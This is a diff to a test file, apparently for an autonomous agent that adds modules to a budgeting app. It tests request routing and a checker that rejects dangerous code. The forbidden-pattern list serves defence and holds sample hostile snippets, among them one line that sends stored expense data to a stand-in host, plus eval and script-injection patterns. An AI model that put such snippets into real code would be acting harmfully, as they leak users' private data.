@@ -50,6 +50,10 @@ describe('build lane routing', () => {
         expect(L.buildLaneFor({ title: 'Please integrate with the CBSL exchange rate feed' }).applies).toBe(true);
         expect(L.buildLaneFor({ title: 'Add a new calculator for lease vs loan' }).applies).toBe(true);
     });
+    it('leaves defect reports to the other lanes even when they say "add"', () => {
+        expect(L.buildLaneFor({ title: 'Add button crashes the app' }).applies).toBe(false);
+        expect(L.buildLaneFor({ title: 'New calculator is not working' }).applies).toBe(false);
+    });
     it('leaves bugs and layout to the other lanes', () => {
         expect(L.buildLaneFor({ title: 'Total on the loans page is wrong' }).applies).toBe(false);
         expect(L.buildLaneFor({ title: 'Button overlaps text on phone' }).applies).toBe(false);
@@ -60,12 +64,17 @@ describe('what a new module may never contain', () => {
     it.each([
         ['eval(x)', /eval/], ['new Function("a")', /new Function/], ['document.write("x")', /document.write/],
         ['import("./x.js")', /dynamic import/], ['DB.set("expenses", [])', /books/], ['localStorage.clear()', /clears/],
-        ['firebase.firestore()', /Firebase/], ['var k="AIzaSyA1234567890abcdefghijk";', /secret/], ['el.innerHTML = `<b>${v}</b>`;', /innerHTML/],
-        ['var s=document.createElement("script");', /script element/],
+        ['firebase.firestore()', /Firebase/], ['var k="AIzaSyA1234567890abcdefghijk";', /secret/], ['el.innerHTML = `<b>${v}</b>`;', /HTML from strings/], ['el.innerHTML = userText;', /HTML from strings/], ['el.insertAdjacentHTML("beforeend", x)', /HTML from strings/],
+        ['var s=document.createElement("script");', /script, iframe/], ['importScripts("x.js")', /./],
+        ['var d = root.DB.get("expenses"); fetch("https://x.example/" + d);', /network/i],
     ])('refuses %s', (code, why) => {
         expect(L.forbiddenIn(code).join(' ')).toMatch(why);
     });
     it('accepts a read-only module', () => { expect(L.forbiddenIn(GOOD)).toEqual([]); });
+    it('allows the network when the module never reads the books, and the books when it never uses the network', () => {
+        expect(L.forbiddenIn('fetch("https://rates.example/usd").then(function (r) { return r.json(); });')).toEqual([]);
+        expect(L.forbiddenIn('var a = root.DB.get("expenses") || [];')).toEqual([]);
+    });
     it('allows reading the books', () => { expect(L.forbiddenIn('var a = root.DB.get("expenses") || [];')).toEqual([]); });
 });
 
@@ -178,5 +187,14 @@ describe('wiring into the agent and the workflow', () => {
         expect(wf).toMatch(/git status --porcelain -- "\$FILE"/);
         expect(wf.match(/extraFiles/g).length).toBeGreaterThanOrEqual(2);
         expect(wf).not.toMatch(/if git diff --quiet -- "\$FILE"/);
+    });
+});
+
+describe('the fix workflow stages only what the build lane may touch', () => {
+    const yml = fs.readFileSync(path.join(ROOT, '.github', 'workflows', 'autonomous-fix.yml'), 'utf8');
+    it('sees an untracked new module as a change', () => { expect(yml).toMatch(/git status --porcelain -- "\$FILE"/); });
+    it('stages index.html and the budget only when the PR file lists them', () => {
+        expect(yml.match(/for EXTRA in index\.html autonomy\/perf-budget\.mjs/g)).toHaveLength(2);
+        expect(yml).toMatch(/extraFiles \|\| \[\]\)\.includes\(process\.argv\[1\]\)/);
     });
 });
